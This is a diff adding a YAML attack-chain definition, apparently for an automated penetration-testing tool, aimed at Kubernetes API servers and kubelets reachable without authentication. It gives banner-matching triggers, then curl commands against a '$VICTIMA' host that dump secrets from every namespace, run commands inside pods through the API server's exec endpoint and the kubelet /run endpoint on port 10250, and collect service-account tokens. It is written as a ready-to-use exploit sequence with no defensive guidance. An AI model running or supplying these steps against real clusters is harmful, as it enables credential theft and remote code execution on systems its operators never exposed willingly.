@@ -1,0 +1,52 @@
+chain_id: kube_api_anonymous
+title: "Kubernetes API — anonymous read / kubelet read-only RCE"
+severity: CRITICAL
+tags: [kubernetes, k8s, api, anonymous, rce, container-escape]
+
+trigger:
+  any_of:
+    - { service_pattern: "(?i)kube|kubelet" }
+    - { banner_pattern: "(?i)kubernetes|kubelet|k8s" }
+    - { product_pattern: "(?i)kubernetes|kubelet" }
+
+description: |
+  Kubernetes API plane reachable without auth (legacy --insecure-port,
+  misconfigured RBAC, or kubelet's read-only port). Three quick wins:
+
+    1. anonymous read on /api → enumerate the cluster, pull secrets.
+    2. exec into any pod via /api/v1/namespaces/.../exec.
+    3. kubelet 10250 /pods → list, /run/.../exec → execute in any pod.
+
+steps:
+  - id: 1
+    title: "Probe the API server (TLS or plain)"
+    command: |
+      curl -k https://$VICTIMA:6443/api/
+      curl    http://$VICTIMA:8080/api/
+      # Look for "kind":"APIVersions" with no auth challenge.
+
+  - id: 2
+    title: "List secrets across all namespaces"
+    command: |
+      curl -k https://$VICTIMA:6443/api/v1/secrets
+
+  - id: 3
+    title: "Execute in a pod (replace ns / pod / container)"
+    command: |
+      curl -k -X POST -H 'Upgrade: websocket' -H 'Connection: Upgrade' \
+        "https://$VICTIMA:6443/api/v1/namespaces/default/pods/POD/exec?command=id&container=NAME&stdin=false&stdout=true"
+
+  - id: 4
+    title: "Kubelet read-only — same idea but no auth at all"
+    command: |
+      curl -k https://$VICTIMA:10250/pods
+      curl -k -X POST "https://$VICTIMA:10250/run/NAMESPACE/POD/CONTAINER" -d 'cmd=id'
+
+  - id: 5
+    title: "Look for service-account tokens dumped from /api/v1/secrets"
+    notes: |
+      kind=kubernetes-token findings will fire here automatically — the
+      extractor picks them up from the JSON response.
+
+references:
+  - https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security
